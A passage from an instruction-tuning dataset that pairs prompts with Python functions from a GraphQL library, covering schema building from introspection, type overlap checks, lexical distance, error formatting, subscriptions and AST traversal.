currently\n    # possible object type.\n    # noinspection PyTypeChecker\n    if (\n        is_abstract_type(super_type)\n        and is_object_type(maybe_subtype)\n        and schema.is_possible_type(\n            cast(GraphQLAbstractType, super_type),\n            cast(GraphQLObjectType, maybe_subtype),\n        )\n    ):\n        return True\n\n    # Otherwise, the child type is not a valid subtype of the parent type.\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef do_types_overlap(schema, type_a, type_b):\n    # Equivalent types overlap\n    if type_a is type_b:\n        return True\n\n    if is_abstract_type(type_a):\n        if is_abstract_type(type_b):\n            # If both types are abstract, then determine if there is any intersection\n            # between possible concrete types of each.\n            return any(\n                schema.is_possible_type(type_b, type_)\n                for type_ in schema.get_possible_types(type_a)\n            )\n        # Determine if latter type is a possible concrete type of the former.\n        return schema.is_possible_type(type_a, type_b)\n\n    if is_abstract_type(type_b):\n        # Determine if former type is a possible concrete type of the latter.\n        return schema.is_possible_type(type_b, type_a)\n\n    # Otherwise the types do not overlap.\n    return False", "response": "Checks whether two types overlap in a given schema."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nbuild a GraphQLSchema instance for use by client tools.", "response": "def build_client_schema(\n    introspection: Dict, assume_valid: bool = False\n) -> GraphQLSchema:\n    \"\"\"Build a GraphQLSchema for use by client tools.\n\n    Given the result of a client running the introspection query, creates and returns\n    a GraphQLSchema instance which can be then used with all GraphQL-core-next tools,\n    but cannot be used to execute a query, as introspection does not represent the\n    \"resolver\", \"parse\" or \"serialize\" functions or any other server-internal\n    mechanisms.\n\n    This function expects a complete introspection result. Don't forget to check the\n    \"errors\" field of a server response before calling this function.\n    \"\"\"\n    # Get the schema from the introspection result.\n    schema_introspection = introspection[\"__schema\"]\n\n    # Given a type reference in introspection, return the GraphQLType instance,\n    # preferring cached instances before building new instances.\n    def get_type(type_ref: Dict) -> GraphQLType:\n        kind = type_ref.get(\"kind\")\n        if kind == TypeKind.LIST.name:\n            item_ref = type_ref.get(\"ofType\")\n            if not item_ref:\n                raise TypeError(\"Decorated type deeper than introspection query.\")\n            return GraphQLList(get_type(item_ref))\n        elif kind == TypeKind.NON_NULL.name:\n            nullable_ref = type_ref.get(\"ofType\")\n            if not nullable_ref:\n                raise TypeError(\"Decorated type deeper than introspection query.\")\n            nullable_type = get_type(nullable_ref)\n            return GraphQLNonNull(assert_nullable_type(nullable_type))\n        name = type_ref.get(\"name\")\n        if not name:\n            raise TypeError(f\"Unknown type reference: {inspect(type_ref)}\")\n        return get_named_type(name)\n\n    def get_named_type(type_name: str) -> GraphQLNamedType:\n        type_ = type_map.get(type_name)\n        if not type_:\n            raise TypeError(\n                f\"Invalid or incomplete schema, unknown type: {type_name}.\"\n                \" Ensure that a full introspection query is used in order\"\n                \" to build a client schema.\"\n            )\n        return type_\n\n    def get_input_type(type_ref: Dict) -> GraphQLInputType:\n        input_type = get_type(type_ref)\n        if not is_input_type(input_type):\n            raise TypeError(\n                \"Introspection must provide input type for arguments,\"\n                f\" but received: {inspect(input_type)}.\"\n            )\n        return cast(GraphQLInputType, input_type)\n\n    def get_output_type(type_ref: Dict) -> GraphQLOutputType:\n        output_type = get_type(type_ref)\n        if not is_output_type(output_type):\n            raise TypeError(\n                \"Introspection must provide output type for fields,\"\n                f\" but received: {inspect(output_type)}.\"\n            )\n        return cast(GraphQLOutputType, output_type)\n\n    def get_object_type(type_ref: Dict) -> GraphQLObjectType:\n        object_type = get_type(type_ref)\n        return assert_object_type(object_type)\n\n    def get_interface_type(type_ref: Dict) -> GraphQLInterfaceType:\n        interface_type = get_type(type_ref)\n        return assert_interface_type(interface_type)\n\n    # Given a type's introspection result, construct the correct GraphQLType instance.\n    def build_type(type_: Dict) -> GraphQLNamedType:\n        if type_ and \"name\" in type_ and \"kind\" in type_:\n            builder = type_builders.get(cast(str, type_[\"kind\"]))\n            if builder:\n                return cast(GraphQLNamedType, builder(type_))\n        raise TypeError(\n            \"Invalid or incomplete introspection result.\"\n            \" Ensure that a full introspection query is used in order\"\n            f\" to build a client schema: {inspect(type_)}\"\n        )\n\n    def build_scalar_def(scalar_introspection: Dict) -> GraphQLScalarType:\n        return GraphQLScalarType(\n            name=scalar_introspection[\"name\"],\n            description=scalar_introspection.get(\"description\"),\n            serialize=lambda value: value,\n        )\n\n    def build_object_def(object_introspection: Dict) -> GraphQLObjectType:\n        interfaces = object_introspection.get(\"interfaces\")\n        if interfaces is None:\n            raise TypeError(\n                \"Introspection result missing interfaces:\"\n                f\" {inspect(object_introspection)}\"\n            )\n        return GraphQLObjectType(\n            name=object_introspection[\"name\"],\n            description=object_introspection.get(\"description\"),\n            interfaces=lambda: [\n                get_interface_type(interface)\n                for interface in cast(List[Dict], interfaces)\n            ],\n            fields=lambda: build_field_def_map(object_introspection),\n        )\n\n    def build_interface_def(interface_introspection: Dict) -> GraphQLInterfaceType:\n        return GraphQLInterfaceType(\n            name=interface_introspection[\"name\"],\n            description=interface_introspection.get(\"description\"),\n            fields=lambda: build_field_def_map(interface_introspection),\n        )\n\n    def build_union_def(union_introspection: Dict) -> GraphQLUnionType:\n        possible_types = union_introspection.get(\"possibleTypes\")\n        if possible_types is None:\n            raise TypeError(\n                \"Introspection result missing possibleTypes:\"\n                f\" {inspect(union_introspection)}\"\n            )\n        return GraphQLUnionType(\n            name=union_introspection[\"name\"],\n            description=union_introspection.get(\"description\"),\n            types=lambda: [\n                get_object_type(type_) for type_ in cast(List[Dict], possible_types)\n            ],\n        )\n\n    def build_enum_def(enum_introspection: Dict) -> GraphQLEnumType:\n        if enum_introspection.get(\"enumValues\") is None:\n            raise TypeError(\n                \"Introspection result missing enumValues:\"\n                f\" {inspect(enum_introspection)}\"\n            )\n        return GraphQLEnumType(\n            name=enum_introspection[\"name\"],\n            description=enum_introspection.get(\"description\"),\n            values={\n                value_introspect[\"name\"]: GraphQLEnumValue(\n                    description=value_introspect.get(\"description\"),\n                    deprecation_reason=value_introspect.get(\"deprecationReason\"),\n                )\n                for value_introspect in enum_introspection[\"enumValues\"]\n            },\n        )\n\n    def build_input_object_def(\n        input_object_introspection: Dict\n    ) -> GraphQLInputObjectType:\n        if input_object_introspection.get(\"inputFields\") is None:\n            raise TypeError(\n                \"Introspection result missing inputFields:\"\n                f\" {inspect(input_object_introspection)}\"\n            )\n        return GraphQLInputObjectType(\n            name=input_object_introspection[\"name\"],\n            description=input_object_introspection.get(\"description\"),\n            fields=lambda: build_input_value_def_map(\n                input_object_introspection[\"inputFields\"]\n            ),\n        )\n\n    type_builders: Dict[str, Callable[[Dict], GraphQLType]] = {\n        TypeKind.SCALAR.name: build_scalar_def,\n        TypeKind.OBJECT.name: build_object_def,\n        TypeKind.INTERFACE.name: build_interface_def,\n        TypeKind.UNION.name: build_union_def,\n        TypeKind.ENUM.name: build_enum_def,\n        TypeKind.INPUT_OBJECT.name: build_input_object_def,\n    }\n\n    def build_field(field_introspection: Dict) -> GraphQLField:\n        if field_introspection.get(\"args\") is None:\n            raise TypeError(\n                \"Introspection result missing field args:\"\n                f\" {inspect(field_introspection)}\"\n            )\n        return GraphQLField(\n            get_output_type(field_introspection[\"type\"]),\n            args=build_arg_value_def_map(field_introspection[\"args\"]),\n            description=field_introspection.get(\"description\"),\n            deprecation_reason=field_introspection.get(\"deprecationReason\"),\n        )\n\n    def build_field_def_map(type_introspection: Dict) -> Dict[str, GraphQLField]:\n        if type_introspection.get(\"fields\") is None:\n            raise TypeError(\n                \"Introspection result missing fields:\" f\" {type_introspection}\"\n            )\n        return {\n            field_introspection[\"name\"]: build_field(field_introspection)\n            for field_introspection in type_introspection[\"fields\"]\n        }\n\n    def build_arg_value(arg_introspection: Dict) -> GraphQLArgument:\n        type_ = get_input_type(arg_introspection[\"type\"])\n        default_value = arg_introspection.get(\"defaultValue\")\n        default_value = (\n            INVALID\n            if default_value is None\n            else value_from_ast(parse_value(default_value), type_)\n        )\n        return GraphQLArgument(\n            type_,\n            default_value=default_value,\n            description=arg_introspection.get(\"description\"),\n        )\n\n    def build_arg_value_def_map(arg_introspections: Dict) -> Dict[str, GraphQLArgument]:\n        return {\n            input_value_introspection[\"name\"]: build_arg_value(\n                input_value_introspection\n            )\n            for input_value_introspection in arg_introspections\n        }\n\n    def build_input_value(input_value_introspection: Dict) -> GraphQLInputField:\n        type_ = get_input_type(input_value_introspection[\"type\"])\n        default_value = input_value_introspection.get(\"defaultValue\")\n        default_value = (\n            INVALID\n            if default_value is None\n            else value_from_ast(parse_value(default_value), type_)\n        )\n        return GraphQLInputField(\n            type_,\n            default_value=default_value,\n            description=input_value_introspection.get(\"description\"),\n        )\n\n    def build_input_value_def_map(\n        input_value_introspections: Dict\n    ) -> Dict[str, GraphQLInputField]:\n        return {\n            input_value_introspection[\"name\"]: build_input_value(\n                input_value_introspection\n            )\n            for input_value_introspection in input_value_introspections\n        }\n\n    def build_directive(directive_introspection: Dict) -> GraphQLDirective:\n        if directive_introspection.get(\"args\") is None:\n            raise TypeError(\n                \"Introspection result missing directive args:\"\n                f\" {inspect(directive_introspection)}\"\n            )\n        if directive_introspection.get(\"locations\") is None:\n            raise TypeError(\n                \"Introspection result missing directive locations:\"\n                f\" {inspect(directive_introspection)}\"\n            )\n        return GraphQLDirective(\n            name=directive_introspection[\"name\"],\n            description=directive_introspection.get(\"description\"),\n            locations=list(\n                cast(\n                    Sequence[DirectiveLocation],\n                    directive_introspection.get(\"locations\"),\n                )\n            ),\n            args=build_arg_value_def_map(directive_introspection[\"args\"]),\n        )\n\n    # Iterate through all types, getting the type definition for each.\n    type_map: Dict[str, GraphQLNamedType] = {\n        type_introspection[\"name\"]: build_type(type_introspection)\n        for type_introspection in schema_introspection[\"types\"]\n    }\n\n    for std_type_name, std_type in chain(\n        specified_scalar_types.items(), introspection_types.items()\n    ):\n        type_map[std_type_name] = std_type\n\n    # Get the root Query, Mutation, and Subscription types.\n\n    query_type_ref = schema_introspection.get(\"queryType\")\n    query_type = None if query_type_ref is None else get_object_type(query_type_ref)\n    mutation_type_ref = schema_introspection.get(\"mutationType\")\n    mutation_type = (\n        None if mutation_type_ref is None else get_object_type(mutation_type_ref)\n    )\n    subscription_type_ref = schema_introspection.get(\"subscriptionType\")\n    subscription_type = (\n        None\n        if subscription_type_ref is None\n        else get_object_type(subscription_type_ref)\n    )\n\n    # Get the directives supported by Introspection, assuming empty-set if directives\n    # were not queried for.\n    directive_introspections = schema_introspection.get(\"directives\")\n    directives = (\n        [\n            build_directive(directive_introspection)\n            for directive_introspection in directive_introspections\n        ]\n        if directive_introspections\n        else []\n    )\n\n    return GraphQLSchema(\n        query=query_type,\n        mutation=mutation_type,\n        subscription=subscription_type,\n        types=list(type_map.values()),\n        directives=directives,\n        assume_valid=assume_valid,\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef concat_ast(asts: Sequence[DocumentNode]) -> DocumentNode:\n    return DocumentNode(\n        definitions=list(chain.from_iterable(document.definitions for document in asts))\n    )", "response": "Concatenate a collection of ASTs into a single batched AST."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets list with suggestions for a given input.", "response": "def suggestion_list(input_: str, options: Collection[str]):\n    \"\"\"Get list with suggestions for a given input.\n\n    Given an invalid input string and list of valid options, returns a filtered list\n    of valid options sorted based on their similarity with the input.\n    \"\"\"\n    options_by_distance = {}\n    input_threshold = len(input_) // 2\n\n    for option in options:\n        distance = lexical_distance(input_, option)\n        threshold = max(input_threshold, len(option) // 2, 1)\n        if distance <= threshold:\n            options_by_distance[option] = distance\n\n    return sorted(options_by_distance, key=options_by_distance.get)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncomputing the lexical distance between two strings A and B.", "response": "def lexical_distance(a_str: str, b_str: str) -> int:\n    \"\"\"Computes the lexical distance between strings A and B.\n\n    The \"distance\" between two strings is given by counting the minimum number of edits\n    needed to transform string A into string B. An edit can be an insertion, deletion,\n    or substitution of a single character, or a swap of two adjacent characters.\n\n    This distance can be useful for detecting typos in input or sorting.\n    \"\"\"\n    if a_str == b_str:\n        return 0\n\n    a, b = a_str.lower(), b_str.lower()\n    a_len, b_len = len(a), len(b)\n\n    # Any case change counts as a single edit\n    if a == b:\n        return 1\n\n    d = [[j for j in range(0, b_len + 1)]]\n    for i in range(1, a_len + 1):\n        d.append([i] + [0] * b_len)\n\n    for i in range(1, a_len + 1):\n        for j in range(1, b_len + 1):\n            cost = 0 if a[i - 1] == b[j - 1] else 1\n\n            d[i][j] = min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + cost)\n\n            if i > 1 and j > 1 and a[i - 1] == b[j - 2] and a[i - 2] == b[j - 1]:\n                d[i][j] = min(d[i][j], d[i - 2][j - 2] + cost)\n\n    return d[a_len][b_len]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget an operation AST node given a document AST and optionally an operation name.", "response": "def get_operation_ast(\n    document_ast: DocumentNode, operation_name: Optional[str] = None\n) -> Optional[OperationDefinitionNode]:\n    \"\"\"Get operation AST node.\n\n    Returns an operation AST given a document AST and optionally an operation\n    name. If a name is not provided, an operation is only returned if only one\n    is provided in the document.\n    \"\"\"\n    operation = None\n    for definition in document_ast.definitions:\n        if isinstance(definition, OperationDefinitionNode):\n            if not operation_name:\n                # If no operation name was provided, only return an Operation if there\n                # is one defined in the document.\n                # Upon encountering the second, return None.\n                if operation:\n                    return None\n                operation = definition\n            elif definition.name and definition.name.value == operation_name:\n                return definition\n    return operation"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nformat a GraphQL error into a dictionary.", "response": "def format_error(error: \"GraphQLError\") -> dict:\n    \"\"\"Format a GraphQL error\n\n    Given a GraphQLError, format it according to the rules described by the \"Response\n    Format, Errors\" section of the GraphQL Specification.\n    \"\"\"\n    if not error:\n        raise ValueError(\"Received null or undefined error.\")\n    formatted: Dict[str, Any] = dict(  # noqa: E701 (pycqa/flake8#394)\n        message=error.message or \"An unknown error occurred.\",\n        locations=error.locations,\n        path=error.path,\n    )\n    if error.extensions:\n        formatted.update(extensions=error.extensions)\n    return formatted"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nexecute a GraphQL operation asynchronously.", "response": "async def graphql(\n    schema: GraphQLSchema,\n    source: Union[str, Source],\n    root_value: Any = None,\n    context_value: Any = None,\n    variable_values: Dict[str, Any] = None,\n    operation_name: str = None,\n    field_resolver: GraphQLFieldResolver = None,\n    type_resolver: GraphQLTypeResolver = None,\n    middleware: Middleware = None,\n    execution_context_class: Type[ExecutionContext] = ExecutionContext,\n) -> ExecutionResult:\n    \"\"\"Execute a GraphQL operation asynchronously.\n\n    This is the primary entry point function for fulfilling GraphQL operations by\n    parsing, validating, and executing a GraphQL document along side a GraphQL schema.\n\n    More sophisticated GraphQL servers, such as those which persist queries, may wish\n    to separate the validation and execution phases to a static time tooling step,\n    and a server runtime step.\n\n    Accepts the following arguments:\n\n    :arg schema:\n      The GraphQL type system to use when validating and executing a query.\n    :arg source:\n      A GraphQL language formatted string representing the requested operation.\n    :arg root_value:\n      The value provided as the first argument to resolver functions on the top level\n      type (e.g. the query object type).\n    :arg context_value:\n      The context value is provided as an attribute of the second argument\n      (the resolve info) to resolver functions. It is used to pass shared information\n      useful at any point during query execution, for example the currently logged in\n      user and connections to databases or other services.\n    :arg variable_values:\n      A mapping of variable name to runtime value to use for all variables defined\n      in the request string.\n    :arg operation_name:\n      The name of the operation to use if request string contains multiple possible\n      operations. Can be omitted if request string contains only one operation.\n    :arg field_resolver:\n      A resolver function to use when one is not provided by the schema.\n      If not provided, the default field resolver is used (which looks for a value\n      or method on the source value with the field's name).\n    :arg type_resolver:\n      A type resolver function to use when none is provided by the schema.\n      If not provided, the default type resolver is used (which looks for a\n      `__typename` field or alternatively calls the `isTypeOf` method).\n    :arg middleware:\n      The middleware to wrap the resolvers with\n    :arg execution_context_class:\n      The execution context class to use to build the context\n    \"\"\"\n    # Always return asynchronously for a consistent API.\n    result = graphql_impl(\n        schema,\n        source,\n        root_value,\n        context_value,\n        variable_values,\n        operation_name,\n        field_resolver,\n        type_resolver,\n        middleware,\n        execution_context_class,\n    )\n\n    if isawaitable(result):\n        return await cast(Awaitable[ExecutionResult], result)\n\n    return cast(ExecutionResult, result)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef graphql_impl(\n    schema,\n    source,\n    root_value,\n    context_value,\n    variable_values,\n    operation_name,\n    field_resolver,\n    type_resolver,\n    middleware,\n    execution_context_class,\n) -> AwaitableOrValue[ExecutionResult]:\n    \"\"\"Execute a query, return asynchronously only if necessary.\"\"\"\n    # Validate Schema\n    schema_validation_errors = validate_schema(schema)\n    if schema_validation_errors:\n        return ExecutionResult(data=None, errors=schema_validation_errors)\n\n    # Parse\n    try:\n        document = parse(source)\n    except GraphQLError as error:\n        return ExecutionResult(data=None, errors=[error])\n    except Exception as error:\n        error = GraphQLError(str(error), original_error=error)\n        return ExecutionResult(data=None, errors=[error])\n\n    # Validate\n    from .validation import validate\n\n    validation_errors = validate(schema, document)\n    if validation_errors:\n        return ExecutionResult(data=None, errors=validation_errors)\n\n    # Execute\n    return execute(\n        schema,\n        document,\n        root_value,\n        context_value,\n        variable_values,\n        operation_name,\n        field_resolver,\n        type_resolver,\n        middleware,\n        execution_context_class,\n    )", "response": "Execute a query asynchronously only if necessary."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_named_type(type_):  # noqa: F811\n    if type_:\n        unwrapped_type = type_\n        while is_wrapping_type(unwrapped_type):\n            unwrapped_type = cast(GraphQLWrappingType, unwrapped_type)\n            unwrapped_type = unwrapped_type.of_type\n        return cast(GraphQLNamedType, unwrapped_type)\n    return None", "response": "Unwrap possible wrapping type"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_nullable_type(type_):  # noqa: F811\n    if is_non_null_type(type_):\n        type_ = cast(GraphQLNonNull, type_)\n        type_ = type_.of_type\n    return cast(Optional[GraphQLNullableType], type_)", "response": "Unwrap possible non - null type"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fields(self) -> GraphQLFieldMap:\n        try:\n            fields = resolve_thunk(self._fields)\n        except GraphQLError:\n            raise\n        except Exception as error:\n            raise TypeError(f\"{self.name} fields cannot be resolved: {error}\")\n        if not isinstance(fields, dict) or not all(\n            isinstance(key, str) for key in fields\n        ):\n            raise TypeError(\n                f\"{self.name} fields must be a dict with field names as keys\"\n                \" or a function which returns such an object.\"\n            )\n        if not all(\n            isinstance(value, GraphQLField) or is_output_type(value)\n            for value in fields.values()\n        ):\n            raise TypeError(\n                f\"{self.name} fields must be GraphQLField or output type objects.\"\n            )\n        return {\n            name: value if isinstance(value, GraphQLField) else GraphQLField(value)\n            for name, value in fields.items()\n        }", "response": "Get provided fields wrapping them as GraphQLFields if needed."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting provided fields wrap them as GraphQLInputField if needed.", "response": "def fields(self) -> GraphQLInputFieldMap:\n        \"\"\"Get provided fields, wrap them as GraphQLInputField if needed.\"\"\"\n        try:\n            fields = resolve_thunk(self._fields)\n        except GraphQLError:\n            raise\n        except Exception as error:\n            raise TypeError(f\"{self.name} fields cannot be resolved: {error}\")\n        if not isinstance(fields, dict) or not all(\n            isinstance(key, str) for key in fields\n        ):\n            raise TypeError(\n                f\"{self.name} fields must be a dict with field names as keys\"\n                \" or a function which returns such an object.\"\n            )\n        if not all(\n            isinstance(value, GraphQLInputField) or is_input_type(value)\n            for value in fields.values()\n        ):\n            raise TypeError(\n                f\"{self.name} fields must be\"\n                \" GraphQLInputField or input type objects.\"\n            )\n        return {\n            name: value\n            if isinstance(value, GraphQLInputField)\n            else GraphQLInputField(value)\n            for name, value in fields.items()\n        }"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nlocates GraphQL Error based on an arbitrary Error.", "response": "def located_error(\n    original_error: Union[Exception, GraphQLError],\n    nodes: Sequence[\"Node\"],\n    path: Sequence[Union[str, int]],\n) -> GraphQLError:\n    \"\"\"Located GraphQL Error\n\n    Given an arbitrary Error, presumably thrown while attempting to execute a GraphQL\n    operation, produce a new GraphQLError aware of the location in the document\n    responsible for the original Error.\n    \"\"\"\n    if original_error:\n        # Note: this uses a brand-check to support GraphQL errors originating from\n        # other contexts.\n        try:\n            if isinstance(original_error.path, list):  # type: ignore\n                return original_error  # type: ignore\n        except AttributeError:\n            pass\n    try:\n        message = original_error.message  # type: ignore\n    except AttributeError:\n        message = str(original_error)\n    try:\n        source = original_error.source  # type: ignore\n    except AttributeError:\n        source = None\n    try:\n        positions = original_error.positions  # type: ignore\n    except AttributeError:\n        positions = None\n    try:\n        nodes = original_error.nodes or nodes  # type: ignore\n    except AttributeError:\n        pass\n    return GraphQLError(message, nodes, source, positions, path, original_error)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupholds the spec rules about naming.", "response": "def assert_valid_name(name: str) -> str:\n    \"\"\"Uphold the spec rules about naming.\"\"\"\n    error = is_valid_name_error(name)\n    if error:\n        raise error\n    return name"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef is_valid_name_error(name: str, node: Node = None) -> Optional[GraphQLError]:\n    if not isinstance(name, str):\n        raise TypeError(\"Expected string\")\n    if name.startswith(\"__\"):\n        return GraphQLError(\n            f\"Name {name!r} must not begin with '__',\"\n            \" which is reserved by GraphQL introspection.\",\n            node,\n        )\n    if not re_name.match(name):\n        return GraphQLError(\n            f\"Names must match /^[_a-zA-Z][_a-zA-Z0-9]*$/ but {name!r} does not.\", node\n        )\n    return None", "response": "Return an Error if a name is invalid."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nsubscribe to a set of items in a node.", "response": "async def subscribe(\n    schema: GraphQLSchema,\n    document: DocumentNode,\n    root_value: Any = None,\n    context_value: Any = None,\n    variable_values: Dict[str, Any] = None,\n    operation_name: str = None,\n    field_resolver: GraphQLFieldResolver = None,\n    subscribe_field_resolver: GraphQLFieldResolver = None,\n) -> Union[AsyncIterator[ExecutionResult], ExecutionResult]:\n    \"\"\"Create a GraphQL subscription.\n\n    Implements the \"Subscribe\" algorithm described in the GraphQL spec.\n\n    Returns a coroutine object which yields either an AsyncIterator (if successful) or\n    an ExecutionResult (client error). The coroutine will raise an exception if a server\n    error occurs.\n\n    If the client-provided arguments to this function do not result in a compliant\n    subscription, a GraphQL Response (ExecutionResult) with descriptive errors and no\n    data will be returned.\n\n    If the source stream could not be created due to faulty subscription resolver logic\n    or underlying systems, the coroutine object will yield a single ExecutionResult\n    containing `errors` and no `data`.\n\n    If the operation succeeded, the coroutine will yield an AsyncIterator, which yields\n    a stream of ExecutionResults representing the response stream.\n    \"\"\"\n    try:\n        result_or_stream = await create_source_event_stream(\n            schema,\n            document,\n            root_value,\n            context_value,\n            variable_values,\n            operation_name,\n            subscribe_field_resolver,\n        )\n    except GraphQLError as error:\n        return ExecutionResult(data=None, errors=[error])\n    if isinstance(result_or_stream, ExecutionResult):\n        return result_or_stream\n    result_or_stream = cast(AsyncIterable, result_or_stream)\n\n    async def map_source_to_response(payload):\n        \"\"\"Map source to response.\n\n        For each payload yielded from a subscription, map it over the normal GraphQL\n        `execute` function, with `payload` as the `root_value`. This implements the\n        \"MapSourceToResponseEvent\" algorithm described in the GraphQL specification.\n        The `execute` function provides the \"ExecuteSubscriptionEvent\" algorithm,\n        as it is nearly identical to the \"ExecuteQuery\" algorithm, for which `execute`\n        is also used.\n        \"\"\"\n        result = execute(\n            schema,\n            document,\n            payload,\n            context_value,\n            variable_values,\n            operation_name,\n            field_resolver,\n        )\n        return await result if isawaitable(result) else result\n\n    return MapAsyncIterator(result_or_stream, map_source_to_response)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a source even stream for subscription source events.", "response": "async def create_source_event_stream(\n    schema: GraphQLSchema,\n    document: DocumentNode,\n    root_value: Any = None,\n    context_value: Any = None,\n    variable_values: Dict[str, Any] = None,\n    operation_name: str = None,\n    field_resolver: GraphQLFieldResolver = None,\n) -> Union[AsyncIterable[Any], ExecutionResult]:\n    \"\"\"Create source even stream\n\n    Implements the \"CreateSourceEventStream\" algorithm described in the GraphQL\n    specification, resolving the subscription source event stream.\n\n    Returns a coroutine that yields an AsyncIterable.\n\n    If the client provided invalid arguments, the source stream could not be created,\n    or the resolver did not return an AsyncIterable, this function will throw an error,\n    which should be caught and handled by the caller.\n\n    A Source Event Stream represents a sequence of events, each of which triggers a\n    GraphQL execution for that event.\n\n    This may be useful when hosting the stateful subscription service in a different\n    process or machine than the stateless GraphQL execution engine, or otherwise\n    separating these two steps. For more on this, see the \"Supporting Subscriptions\n    at Scale\" information in the GraphQL spec.\n    \"\"\"\n    # If arguments are missing or incorrectly typed, this is an internal developer\n    # mistake which should throw an early error.\n    assert_valid_execution_arguments(schema, document, variable_values)\n\n    # If a valid context cannot be created due to incorrect arguments, this will throw\n    # an error.\n    context = ExecutionContext.build(\n        schema,\n        document,\n        root_value,\n        context_value,\n        variable_values,\n        operation_name,\n        field_resolver,\n    )\n\n    # Return early errors if execution context failed.\n    if isinstance(context, list):\n        return ExecutionResult(data=None, errors=context)\n\n    type_ = get_operation_root_type(schema, context.operation)\n    fields = context.collect_fields(type_, context.operation.selection_set, {}, set())\n    response_names = list(fields)\n    response_name = response_names[0]\n    field_nodes = fields[response_name]\n    field_node = field_nodes[0]\n    field_name = field_node.name.value\n    field_def = get_field_def(schema, type_, field_name)\n\n    if not field_def:\n        raise GraphQLError(\n            f\"The subscription field '{field_name}' is not defined.\", field_nodes\n        )\n\n    # Call the `subscribe()` resolver or the default resolver to produce an\n    # AsyncIterable yielding raw payloads.\n    resolve_fn = field_def.subscribe or context.field_resolver\n    resolve_fn = cast(GraphQLFieldResolver, resolve_fn)  # help mypy\n\n    path = add_path(None, response_name)\n\n    info = context.build_resolve_info(field_def, field_nodes, type_, path)\n\n    # `resolve_field_value_or_error` implements the \"ResolveFieldEventStream\" algorithm\n    # from GraphQL specification. It differs from `resolve_field_value` due to\n    # providing a different `resolve_fn`.\n    result = context.resolve_field_value_or_error(\n        field_def, field_nodes, resolve_fn, root_value, info\n    )\n    event_stream = await cast(Awaitable, result) if isawaitable(result) else result\n    # If `event_stream` is an Error, rethrow a located error.\n    if isinstance(event_stream, Exception):\n        raise located_error(event_stream, field_nodes, response_path_as_list(path))\n\n    # Assert field returned an event stream, otherwise yield an error.\n    if isinstance(event_stream, AsyncIterable):\n        return cast(AsyncIterable, event_stream)\n    raise TypeError(\n        f\"Subscription field must return AsyncIterable. Received: {event_stream!r}\"\n    )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngive [ A B C ) return A B or C.", "response": "def or_list(items: Sequence[str]) -> Optional[str]:\n    \"\"\"Given [A, B, C] return 'A, B, or C'.\"\"\"\n    if not items:\n        raise ValueError\n\n    if len(items) == 1:\n        return items[0]\n    if len(items) == 2:\n        return items[0] + \" or \" + items[1]\n\n    *selected, last_item = items[:MAX_LENGTH]\n    return \", \".join(selected) + \" or \" + last_item"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nvisit each node in an AST.", "response": "def visit(root: Node, visitor: Visitor, visitor_keys=None) -> Any:\n    \"\"\"Visit each node in an AST.\n\n    `visit()` will walk through an AST using a depth first traversal, calling the\n    visitor's enter methods at each node in the traversal, and calling the leave methods\n    after visiting that node and all of its child nodes.\n\n    By returning different values from the enter and leave methods, the behavior of the\n    visitor can be altered, including skipping over a sub-tree of the AST (by returning\n    False), editing the AST by returning a value or None to remove the value, or to stop\n    the whole traversal by returning BREAK.\n\n    When using `visit()` to edit an AST, the original AST will not be modified, and a\n    new version of the AST with the changes applied will be returned from the visit\n    function.\n\n    To customize the node attributes to be used for traversal, you can provide a\n    dictionary visitor_keys mapping node kinds to node attributes.\n    \"\"\"\n    if not isinstance(root, Node):\n        raise TypeError(f\"Not an AST Node: {inspect(root)}\")\n    if not isinstance(visitor, Visitor):\n        raise TypeError(f\"Not an AST Visitor class: {inspect(visitor)}\")\n    if visitor_keys is None:\n        visitor_keys = QUERY_DOCUMENT_KEYS\n    stack: Any = None\n    in_array = isinstance(root, list)\n    keys: Tuple[Node, ...] = (root,)\n    idx = -1\n    edits: List[Any] = []\n    parent: Any = None\n    path: List[Any] = []\n    path_append = path.append\n    path_pop = path.pop\n    ancestors: List[Any] = []\n    ancestors_append = ancestors.append\n    ancestors_pop = ancestors.pop\n    new_root = root\n\n    while True:\n        idx += 1\n        is_leaving = idx == len(keys)\n        is_edited = is_leaving and edits\n        if is_leaving:\n            key = path[-1] if ancestors else None\n            node: Any = parent\n            parent = ancestors_pop() if ancestors else None\n            if is_edited:\n                if in_array:\n                    node = node[:]\n                else:\n                    node = copy(node)\n            edit_offset = 0\n            for edit_key, edit_value in edits:\n                if in_array:\n                    edit_key -= edit_offset\n                if in_array and edit_value is REMOVE:\n                    node.pop(edit_key)\n                    edit_offset += 1\n                else:\n                    if isinstance(node, list):\n                        node[edit_key] = edit_value\n                    else:\n                        setattr(node, edit_key, edit_value)\n\n            idx = stack.idx\n            keys = stack.keys\n            edits = stack.edits\n            in_array = stack.in_array\n            stack = stack.prev\n        else:\n            if parent:\n                if in_array:\n                    key = idx\n                    node = parent[key]\n                else:\n                    key = keys[idx]\n                    node = getattr(parent, key, None)\n            else:\n                key = None\n                node = new_root\n            if node is None or node is REMOVE:\n                continue\n            if parent:\n                path_append(key)\n\n        if 